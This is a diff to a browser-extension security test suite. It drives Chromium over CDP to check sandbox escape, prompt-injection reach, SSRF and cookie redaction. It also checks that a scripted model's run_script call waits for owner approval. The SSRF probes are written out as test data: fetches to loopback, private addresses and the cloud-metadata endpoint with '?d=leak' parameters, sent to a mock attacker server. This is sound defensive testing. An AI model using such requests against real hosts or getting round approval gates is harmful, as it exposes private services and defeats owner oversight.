@@ -11,18 +11,36 @@
 //   3. PROMPT-INJECTION → DESTRUCTIVE — the sandboxed frame has no chrome.*
 //      API, so page-controlled HTML cannot invoke a destructive extension tool.
 //
+// and, since CAP-FB-20260830-SUITE-HONESTY-01, four boundaries of the LOADED
+// EXTENSION itself (the suite used to report 7/7 without ever loading it):
+//
+//   4. SENDER-DERIVED AUTHORITY — a page-world script has no chrome.runtime at
+//      all, and the extension's own content-script world may only reach the
+//      page-allowed routes: a call to any other route is refused by the
+//      service worker from the browser-attested sender, never from the body.
+//   5. cap:fetch SSRF — a sandboxed script's fetch to loopback / RFC1918 /
+//      link-local (cloud metadata) / localhost is refused before any request
+//      leaves the browser (the attacker host sees nothing).
+//   6. script.run GATING — a non-owner principal cannot run a script directly,
+//      and a MODEL-initiated run_script (driven through the real provider path
+//      by the scripted provider) pauses on the in-context approval card with
+//      the script un-run until the owner decides.
+//   7. COOKIE REDACTION — list_cookies never carries a `value` field.
+//
 // The escape frame reports its observations to the parent via postMessage (the
 // one channel that works from an opaque frame); the parent records them into
 // window.__securityResults, which the CDP probe reads. The production surface
 // only ACTS on validated messages (see the preference-percolation design), so
 // an untrusted frame's postMessage is observation, never action.
 //
-//   npm run test:security
+//   npm run test:security        (the supervisor holds the serialized-Chrome lock)
 
 import { inspectExactProfile, verifyRunnerGuard } from "./security-suite-custody.mjs";
+import { launchChrome, openCdp, type CdpClient } from "./lib/chrome-launch.ts";
+import { SCRIPTED_DUMMY_KEY, selectionRefOf, startScriptedProvider } from "./lib/scripted-provider.ts";
 
 const ROOT = new URL("..", import.meta.url).pathname;
-const CHROMIUM = "/usr/bin/chromium";
+const EXT = `${ROOT}extension`;
 
 // Refuse before servers, profiles, or Chromium unless the supervisor-issued
 // nonce/parent guard and inherited canonical flock open-file description are live.
@@ -51,18 +69,19 @@ const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 // ── the attacker host (port B): counts every request it receives. If a frame
 //    can exfiltrate over the network, these counters move.
 let attackerRequests = 0;
-let attackerPaths: string[] = [];
-function attackerServer(): Promise<{ url: string; requests: () => number; paths: () => string[]; close: () => Promise<void> }> {
+const attackerPaths: string[] = [];
+function attackerServer(): Promise<{ url: string; port: number; requests: () => number; paths: () => string[]; close: () => Promise<void> }> {
   return new Promise((resolve) => {
     const ac = new AbortController();
-    const server = Deno.serve({ port: 0, signal: ac.signal, onListen: ({ port }) => {
+    const server = Deno.serve({ port: 0, hostname: "127.0.0.1", signal: ac.signal, onListen: ({ port }) => {
       resolve({
         url: `http://127.0.0.1:${port}`,
+        port,
         requests: () => attackerRequests,
         paths: () => attackerPaths,
         close: async () => { ac.abort(); await server.shutdown(); },
       });
-    } }, async (req) => {
+    } }, (req) => {
       attackerRequests++;
       try { attackerPaths.push(new URL(req.url).pathname); } catch { attackerPaths.push(String(req.url)); }
       return new Response("leaked", { headers: { "access-control-allow-origin": "*" } });
@@ -75,7 +94,7 @@ function attackerServer(): Promise<{ url: string; requests: () => number; paths:
 function docsServer(fixture: string): Promise<{ url: string; close: () => Promise<void> }> {
   return new Promise((resolve) => {
     const ac = new AbortController();
-    const server = Deno.serve({ port: 0, signal: ac.signal, onListen: ({ port }) => {
+    const server = Deno.serve({ port: 0, hostname: "127.0.0.1", signal: ac.signal, onListen: ({ port }) => {
       resolve({
         url: `http://127.0.0.1:${port}`,
         close: async () => { ac.abort(); await server.shutdown(); },
@@ -162,89 +181,215 @@ for (const k of Object.keys(frames)) {
 </script>
 </body></html>`;
 
+/** `chrome.runtime.sendMessage` from an extension page context. */
+async function sendFrom(cdp: CdpClient, session: string, payload: unknown): Promise<any> {
+  return await cdp.eval(
+    session,
+    `chrome.runtime.sendMessage(${JSON.stringify(payload)}).then(v => ({ v }), e => ({ err: String(e && e.message || e) }))`,
+  ).then((r) => (r && typeof r === "object" && "v" in r) ? r.v : r);
+}
+
+/** A genuine CDP click on an element (coordinates discovered, input real). */
+async function clickAt(cdp: CdpClient, session: string, expr: string): Promise<boolean> {
+  const b = await cdp.eval(session, expr).catch(() => null);
+  if (!b || typeof b.x !== "number") return false;
+  await cdp.send("Input.dispatchMouseEvent", { type: "mousePressed", x: b.x, y: b.y, button: "left", buttons: 1, clickCount: 1 }, session);
+  await cdp.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: b.x, y: b.y, button: "left", buttons: 0, clickCount: 1 }, session);
+  return true;
+}
+const centerOf = (selector: string) =>
+  `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return null; el.scrollIntoView({ block: "center", inline: "center" }); const r = el.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`;
+
 async function main() {
   const attacker = await attackerServer();
   const fixture = fixtureHtml.replaceAll("__ATTACKER_URL__", attacker.url);
   const docs = await docsServer(fixture);
-
-  const tmp = providedProfile;
-  const proc = new Deno.Command(CHROMIUM, {
-    args: [
-      "--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
-      "--disable-gpu", "--remote-debugging-port=0", "--remote-allow-origins=*",
-      "--window-size=1440,900", `--user-data-dir=${tmp}`, "about:blank",
+  // The scripted provider: the model's side of the run_script journey (check 6).
+  let scriptIdForModel = "";
+  const provider = await startScriptedProvider({
+    steps: [
+      { tool: "search_tools", args: { query: "run_script", limit: 1 } },
+      { tool: "execute_tool", args: (req) => ({ selectionRef: selectionRefOf(req), arguments: { origin: "master", id: scriptIdForModel } }) },
+      { text: "The script run was decided by the owner." },
+      { text: "The script run was decided by the owner." }, // the reply to agent-do's nudge turn
     ],
-    stdout: "null",
-    stderr: "piped",
-  }).spawn();
+  });
 
-  let wsUrl = "";
-  const reader = proc.stderr.getReader();
-  const deadline = Date.now() + 15000;
-  let acc = "";
-  while (Date.now() < deadline && !wsUrl) {
-    const { value, done } = await reader.read();
-    if (done) break;
-    acc += new TextDecoder().decode(value);
-    const m = acc.match(/DevTools listening on (ws:\/\/\S+)/);
-    if (m) wsUrl = m[1];
-  }
-  if (!wsUrl) {
-    console.log("FAIL: could not find the Chrome DevTools URL");
-    await attacker.close(); await docs.close();
-    Deno.exit(1);
-  }
-
-  let id = 0;
-  const pend = new Map<number, (v: unknown) => void>();
-  const ws = new WebSocket(wsUrl);
-  await new Promise<void>((res, rej) => { ws.onopen = () => res(); ws.onerror = rej; });
-  ws.onmessage = (ev) => {
-    const m = JSON.parse(ev.data);
-    if (m.id && pend.has(m.id)) {
-      const resolve = pend.get(m.id)!;
-      pend.delete(m.id);
-      resolve(m.error ? Promise.reject(new Error(m.error.message)) : m.result);
-    }
-  };
-  const send = (method: string, params: unknown, sessionId?: string): Promise<any> => {
-    const mid = ++id;
-    return new Promise((resolve) => { pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method, params, sessionId })); });
-  };
-  const evl = async (s: string, expr: string): Promise<any> => {
-    const r = await send("Runtime.evaluate", { expression: expr, returnByValue: true, awaitPromise: true }, s);
-    return r?.result?.value;
-  };
+  // ONE browser, launched through the shared launcher WITH the extension: the
+  // renderHtmlFrame fixture and the extension checks share it (the supervisor
+  // issues exactly one profile).
+  const chrome = await launchChrome({ extension: EXT, profile: providedProfile, windowSize: "1440,900", timeoutMs: 20000 });
+  console.log(`security-suite: launched ${chrome.wsUrl.replace(/\/devtools\/browser\/.*/, "/devtools/browser/…")} with --load-extension=${EXT}`);
+  const cdp = await openCdp(chrome.wsUrl);
 
   try {
-    const t = await send("Target.createTarget", { url: `${docs.url}/security-fixture` });
-    const s = await send("Target.attachToTarget", { targetId: t.targetId, flatten: true });
-    await send("Runtime.enable", {}, s.sessionId);
-    await send("Page.enable", {}, s.sessionId);
+    // ── 1-3: the renderHtmlFrame boundaries on the fixture page ──────────
+    const fx = await cdp.open(`${docs.url}/security-fixture`);
     await sleep(3500);
 
-    // 1. NETWORK EXFIL — did any request reach the attacker host?
     const n = attacker.requests();
-    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: (attacker as any).paths?.() });
+    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: attacker.paths() });
 
-    // 2 + 3. The escape frame's observations (reported via postMessage).
-    const results = await evl(s.sessionId, `window.__securityResults ?? []`);
+    const results = await cdp.eval(fx.sessionId, `window.__securityResults ?? []`);
     const escape = (results ?? []).find((x: any) => x?.result?.parentRead !== undefined)?.result ?? null;
     check("sandbox escape: parent.document is blocked", String(escape?.parentRead ?? "").startsWith("blocked"), escape);
     check("sandbox escape: top navigation is blocked", String(escape?.topNav ?? "").startsWith("blocked"), escape);
     check("sandbox escape: window.opener is null", escape?.opener === "null", escape);
     check("prompt-injection: no chrome.runtime (extension API) in the sandbox", escape?.chromeRuntime === "absent", escape);
 
-    // the outer page must still be on the fixture (top-nav blocked)
-    const path = await evl(s.sessionId, `location.pathname`);
+    const path = await cdp.eval(fx.sessionId, `location.pathname`);
     check("sandbox escape: the outer page did not navigate away", String(path).includes("security-fixture"), path);
 
-    // a second settle to catch any delayed beacon/ws
     await sleep(1500);
     const n2 = attacker.requests();
     check("network exfil: still zero after settle", n2 === 0, { attackerRequests: n2 });
+
+    // ── the loaded extension ─────────────────────────────────────────────
+    const sw = await cdp.serviceWorker({ timeoutMs: 20000 });
+    check("extension: the service worker target registered (--load-extension)", !!sw, { url: sw?.url ?? null, tail: chrome.stderrTail().slice(-300) });
+    if (!sw) throw new Error("the extension did not load; the remaining checks cannot run");
+    const extId = new URL(sw.url).host;
+    console.log(`security-suite: service worker target ${sw.url}`);
+
+    // 4. SENDER-DERIVED AUTHORITY. The fixture page is a plain http page: its
+    //    MAIN world has no chrome.runtime at all (nothing is externally
+    //    connectable), and the extension's own ISOLATED content-script world —
+    //    the only page-side principal that can message the worker — is
+    //    confined to the page-allowed routes by the browser-attested sender.
+    const contexts: any[] = [];
+    const off = cdp.on("Runtime.executionContextCreated", (p, sid) => { if (sid === fx.sessionId) contexts.push(p?.context); });
+    // Re-enable to have every existing context re-announced on this session.
+    await cdp.send("Runtime.disable", {}, fx.sessionId).catch(() => {});
+    await cdp.send("Runtime.enable", {}, fx.sessionId);
+    await sleep(300);
+    off();
+    const mainRuntime = await cdp.eval(fx.sessionId, `typeof chrome === "object" && chrome && typeof chrome.runtime`);
+    check("sender authority: a page's MAIN world has no chrome.runtime", mainRuntime === "undefined" || mainRuntime === false, { mainRuntime });
+    const isolated = contexts.find((c) => c?.auxData?.type === "isolated");
+    const inWorld = async (expr: string) => {
+      const r = await cdp.send("Runtime.evaluate", { expression: expr, contextId: isolated.id, returnByValue: true, awaitPromise: true }, fx.sessionId);
+      return r?.result?.result?.value;
+    };
+    let refusedRoute: any = null, allowedRoute: any = null;
+    if (isolated) {
+      refusedRoute = await inWorld(`chrome.runtime.sendMessage({ type: "agent.list" }).then(v => v, e => ({ thrown: String(e && e.message || e) }))`).catch((e) => ({ evalError: String(e?.message ?? e) }));
+      allowedRoute = await inWorld(`chrome.runtime.sendMessage({ type: "tools.list" }).then(v => v, e => ({ thrown: String(e && e.message || e) }))`).catch((e) => ({ evalError: String(e?.message ?? e) }));
+    }
+    check(
+      "sender authority: the content-script world is refused on a non-page route (agent.list)",
+      !!isolated && refusedRoute?.ok === false && /not authorized from a page/.test(String(refusedRoute?.error ?? "")),
+      { isolated: !!isolated, refusedRoute, contexts: contexts.map((c) => ({ name: c?.name, type: c?.auxData?.type })) },
+    );
+    check(
+      "sender authority: the same world still reaches a page-allowed route (tools.list) — the refusal is the route, not a dead channel",
+      !!isolated && allowedRoute && typeof allowedRoute === "object" && !("thrown" in allowedRoute) && !("evalError" in allowedRoute) && allowedRoute.error !== "not authorized from a page",
+      { allowedRoute },
+    );
+
+    // Open Settings (the owner principal) and the hub (the run surface).
+    const opts = await cdp.open(`chrome-extension://${extId}/options/options.html`);
+    await sleep(1500);
+    const ntp = await cdp.open(`chrome-extension://${extId}/ntp/ntp.html`);
+    await sleep(2000);
+
+    // 5. cap:fetch SSRF — four private targets, each refused before any request.
+    const targets = [
+      ["loopback 127.0.0.1", `${attacker.url}/?d=leak`],
+      ["RFC1918 10.0.0.1", "http://10.0.0.1/?d=leak"],
+      ["link-local 169.254.169.254 (cloud metadata)", "http://169.254.169.254/latest/meta-data/?d=leak"],
+      ["localhost", `http://localhost:${attacker.port}/?d=leak`],
+    ];
+    const attackerBefore = attacker.requests();
+    const createdScripts: string[] = [];
+    for (const [label, url] of targets) {
+      const created = await sendFrom(cdp, opts.sessionId, { type: "script.create", origin: "master", name: `ssrf probe ${label}`, source: `return (await fetch(${JSON.stringify(url)})).status` });
+      const id = created?.script?.id ?? "";
+      if (id) createdScripts.push(id);
+      const run = id ? await sendFrom(cdp, opts.sessionId, { type: "script.run", origin: "master", id }) : created;
+      check(
+        `cap:fetch: ${label} is refused from a sandboxed script`,
+        run?.ok === false && /private or loopback address/.test(String(run?.error ?? "")),
+        { created: created?.ok, run },
+      );
+    }
+    check("cap:fetch: the attacker host saw no request from the four probes", attacker.requests() === attackerBefore, { before: attackerBefore, after: attacker.requests(), paths: attacker.paths() });
+
+    // 6. script.run GATING. An owner's own click in an extension UI document
+    //    is owner-direct by design (the Settings probes above ran directly), and
+    //    a page cannot reach the route at all (check 4). The boundary that
+    //    matters is the MODEL principal: a model-initiated run_script, through
+    //    the REAL provider path (the scripted provider answers search_tools →
+    //    execute_tool(run_script)), must pause on the in-context approval card
+    //    with the source visible and the script un-run until the owner decides.
+    const gated = await sendFrom(cdp, opts.sessionId, { type: "script.create", origin: "master", name: "gate probe", source: `const url = "https://example.com/";\nreturn url.length;` });
+    scriptIdForModel = gated?.script?.id ?? "";
+    if (scriptIdForModel) createdScripts.push(scriptIdForModel);
+    const setProvider = await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "openai-compatible", baseURL: provider.baseURL, apiKey: SCRIPTED_DUMMY_KEY, model: "scripted" } });
+    await cdp.send("Target.activateTarget", { targetId: ntp.targetId }).catch(() => {});
+    await cdp.send("Page.bringToFront", {}, ntp.sessionId).catch(() => {});
+    let composer = false;
+    for (let i = 0; i < 20 && !composer; i++) {
+      composer = await clickAt(cdp, ntp.sessionId, centerOf("#task-input"));
+      if (!composer) await sleep(250);
+    }
+    if (composer) {
+      // Genuine key events (the composer enables Run on real input).
+      for (const ch of "run the gate probe script") {
+        await cdp.send("Input.dispatchKeyEvent", { type: "char", text: ch, unmodifiedText: ch }, ntp.sessionId);
+      }
+      await clickAt(cdp, ntp.sessionId, centerOf("#run-task"));
+    }
+    const readCard = () => cdp.eval(
+      ntp.sessionId,
+      `(() => { const card = document.querySelector("approval-card"); if (!card) return null; const root = card.shadowRoot; return { state: card.getAttribute("state") || "pending", title: root?.querySelector(".title")?.textContent ?? "", source: root?.querySelector(".source")?.textContent ?? null, hasApprove: !!root?.querySelector(".approve") }; })()`,
+    ).catch(() => null);
+    let card: any = null;
+    for (let i = 0; i < 60 && !card?.hasApprove; i++) {
+      card = await readCard();
+      if (!card?.hasApprove) await sleep(500);
+    }
+    const beforeDecision = await sendFrom(cdp, opts.sessionId, { type: "script.get", origin: "master", id: scriptIdForModel });
+    const threadText = card?.hasApprove ? "" : await cdp.eval(ntp.sessionId, `(() => { const out = []; const walk = (n) => { if (n.nodeType === 3) { out.push(n.data); return; } if (n.nodeType !== 1 && n.nodeType !== 11) return; if (n.nodeType === 1 && (n.tagName === 'SCRIPT' || n.tagName === 'STYLE')) return; if (n.shadowRoot) walk(n.shadowRoot); for (const c of n.childNodes) walk(c); }; walk(document.getElementById('thread-conversation') ?? document.body); return out.join(' ').replace(/\\s+/g, ' ').slice(0, 600); })()`).catch(() => "");
+    check(
+      "script.run: a model-initiated run_script (real provider path) pauses on the approval card with the source shown and the script un-run",
+      setProvider?.ok !== false && composer && card?.hasApprove === true && card?.title === "Run this script now?" &&
+        typeof card?.source === "string" && card.source.includes("example.com") && beforeDecision?.script?.lastRunAt == null,
+      { setProvider: setProvider?.provider, composer, card, lastRunAt: beforeDecision?.script?.lastRunAt ?? null, providerRequests: provider.requests.map((r) => ({ tools: r.toolNames.length, msgs: r.messages.length, stream: r.stream })), overflow: provider.overflow, threadText },
+    );
+    // Evidence: the card as the owner sees it, kept beside the supervisor's
+    // guard record (the run's own evidence directory).
+    try {
+      const shot = await cdp.send("Page.captureScreenshot", { format: "png" }, ntp.sessionId);
+      const b64 = shot?.result?.data;
+      const guard = Deno.env.get("CAP_SECURITY_GUARD") ?? "";
+      if (b64 && guard) {
+        const dir = guard.slice(0, guard.lastIndexOf("/"));
+        await Deno.writeFile(`${dir}/security-suite-approval-card.png`, Uint8Array.from(atob(b64), (c) => c.charCodeAt(0)));
+        console.log(`security-suite: evidence ${dir}/security-suite-approval-card.png`);
+      }
+    } catch { /* evidence only */ }
+    // Decide "Not now" with a genuine click so the run settles before teardown.
+    await clickAt(cdp, ntp.sessionId, `(() => { const b = document.querySelector("approval-card")?.shadowRoot?.querySelector(".deny, .not-now, button:not(.approve)"); if (!b) return null; b.scrollIntoView({ block: "center" }); const r = b.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`);
+    await sleep(1500);
+
+    // 7. COOKIE REDACTION — list_cookies output never carries a value.
+    const cookies = await sendFrom(cdp, ntp.sessionId, { type: "agent-worker.tool", toolName: "list_cookies", args: { domain: "127.0.0.1" } });
+    const cookiesJson = JSON.stringify(cookies ?? null);
+    check(
+      "cookies: list_cookies returns no value field (metadata only)",
+      cookies?.error !== "unknown tool: list_cookies" && !/"value"/.test(cookiesJson),
+      { cookies: cookiesJson.slice(0, 300) },
+    );
+
+    for (const id of createdScripts) await sendFrom(cdp, opts.sessionId, { type: "script.delete", origin: "master", id }).catch(() => {});
+    await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "demo", apiKey: "" } }).catch(() => {});
+  } catch (e) {
+    check("suite: ran to completion", false, String((e as Error)?.message ?? e));
   } finally {
-    try { proc.kill("SIGKILL"); } catch { /* already dead */ }
+    cdp.close();
+    try { chrome.proc.kill("SIGKILL"); } catch { /* already dead */ }
+    try { await chrome.proc.status; } catch { /* reaped */ }
+    await provider.close();
     await attacker.close();
     await docs.close();
   }
